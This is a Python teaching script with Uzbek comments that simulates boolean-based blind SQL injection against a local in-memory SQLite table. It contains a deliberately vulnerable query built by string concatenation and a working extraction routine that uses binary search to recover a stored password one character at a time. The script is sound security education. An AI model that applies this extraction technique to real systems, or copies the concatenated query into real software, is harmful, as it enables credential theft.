"""
3-misol: Boolean-based blind SQL injection algoritmi (simulyatsiya).
Zaif funksiya faqat True/False qaytaradi, lekin binar qidiruv bilan
maxfiy qiymatni belgima-belgi tiklash mumkin. Bu nima uchun "xato
ko'rsatmaslik" yetarli himoya EMASligini ko'rsatadi.
Hammasi lokal, xotiradagi bazada ishlaydi.
"""
import sqlite3

con = sqlite3.connect(":memory:")
con.execute("CREATE TABLE users (id INTEGER, login TEXT, parol TEXT)")
con.execute("INSERT INTO users VALUES (1, 'admin', 'iris2024')")
SOROVLAR = 0


def zaif_mahsulot_bormi(mahsulot_id: str) -> bool:
    """Zaif endpoint: faqat 'bor' / 'yo'q' javob qaytaradi."""
    global SOROVLAR
    SOROVLAR += 1
    sql = "SELECT 1 FROM users WHERE id = " + mahsulot_id   # XATO: konkatenatsiya
    try:
        return con.execute(sql).fetchone() is not None
    except sqlite3.Error:
        return False


def oracle(shart: str) -> bool:
    """Hujumchi shartni so'rovga qo'shib, javobga qarab rost/yolg'onni biladi."""
    return zaif_mahsulot_bormi(f"1 AND ({shart})")


def uzunlikni_topish(maks=64):
    for n in range(1, maks + 1):
        if oracle(f"(SELECT length(parol) FROM users WHERE id=1) = {n}"):
            return n
    return 0


def belgini_topish(pozitsiya: int) -> str:
    """Binar qidiruv: ASCII 32..126 oralig'ida ~7 so'rovda belgi topiladi."""
    past, yuqori = 32, 126
    while past < yuqori:
        orta = (past + yuqori) // 2
        if oracle(f"unicode(substr((SELECT parol FROM users WHERE id=1), {pozitsiya}, 1)) > {orta}"):
            past = orta + 1
        else:
            yuqori = orta
    return chr(past)


if __name__ == "__main__":
    n = uzunlikni_topish()
    print("Parol uzunligi:", n)
    topilgan = ""
    for i in range(1, n + 1):
        topilgan += belgini_topish(i)
        print(f"  {i}-belgi -> {topilgan}")
    print(f"\nTiklangan qiymat: {topilgan!r}, jami so'rovlar: {SOROVLAR}")
    print("Xulosa: javobda ma'lumot ko'rinmasa ham, zaiflik baribir xavfli.")
